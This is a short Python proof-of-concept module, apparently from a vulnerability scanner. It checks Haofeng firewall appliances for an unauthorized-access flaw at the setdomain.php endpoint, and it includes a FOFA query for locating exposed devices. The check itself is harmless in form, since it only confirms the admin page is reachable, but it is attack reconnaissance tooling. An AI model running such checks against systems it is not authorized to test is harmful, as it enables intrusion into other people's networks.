#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/皓峰/皓峰防火墙 setdomain.php 越权访问漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '皓峰防火墙 setdomain.php 越权访问',

      'level'     :   'high',

      'FOFA'      :   'app="皓峰防火墙系统登录"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/setdomain.php?action=list'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    res.encoding='utf-8'
    # print(res.text)
    if re.search(r'<title>皓峰系统管理平台</title>.*?域名绑定列表.*?序号</td>.*?域名地址</td>.*?',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      ret['url'] = url1
      return ret
    else:
      return ret
  except:
    return ret